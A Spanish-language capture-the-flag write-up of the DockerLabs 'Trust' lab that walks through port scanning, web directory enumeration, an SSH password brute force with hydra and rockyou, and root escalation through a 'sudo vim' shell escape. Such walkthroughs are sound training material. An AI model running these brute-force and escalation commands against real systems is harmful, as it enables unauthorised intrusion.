---
Estado: Completado
Plataforma: DockerLabs
SO: Linux
Dificultad: Muy Fácil
VectorInicial: Fuerza bruta SSH
Privesc: Sudo vim
Fecha: 2026-02-04
---

# Trust

## Reconocimiento inicial

Se comienza con una enumeración de puertos y servicios:

```bash
nmap -sSVC 172.18.0.2
```

La máquina expone dos servicios:

- `22/tcp` → SSH
- `80/tcp` → HTTP

## Enumeración web

La web muestra únicamente la página por defecto de Apache, así que se procede a enumerar directorios y archivos.

Primero con `dirb`:

```bash
dirb http://172.18.0.2
```

Después con `gobuster`:

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```

Y finalmente buscando extensiones típicas:

```bash
gobuster dir -u http://172.18.0.2/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -x php,txt,html
```

Aquí aparece un archivo interesante, `secret.php`, que sugiere la existencia de un usuario llamado `mario`.

## Acceso inicial

Con el puerto SSH abierto y un usuario probable identificado, se realiza fuerza bruta con `hydra`:

```bash
hydra -l mario -P /usr/share/wordlists/rockyou.txt 172.18.0.2 -t 5 ssh
```

Una vez obtenida la contraseña, se accede por SSH:

```bash
ssh mario@172.18.0.2
```

## Escalada de privilegios

Ya en el sistema, se revisan privilegios sudo:

```bash
sudo -l
```

La salida muestra que `mario` puede ejecutar `vim` con privilegios elevados.

Consultando GTFOBins, la escalada resulta directa:

```bash
sudo vim -c ':!/bin/bash'
```

## Conclusión

La secuencia de explotación es simple pero efectiva:

1. Enumeración web.
2. Descubrimiento de `secret.php`.
3. Identificación del usuario `mario`.
4. Fuerza bruta SSH.
5. Escalada a root mediante `vim` permitido en `sudo`.

Laboratorio básico, sí, pero útil para recordar que una mala configuración de `sudo` puede destrozar por completo la seguridad del sistema.

---
Si te gustó, puedes invitarme a un café.
[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/C0C61UHTB1)

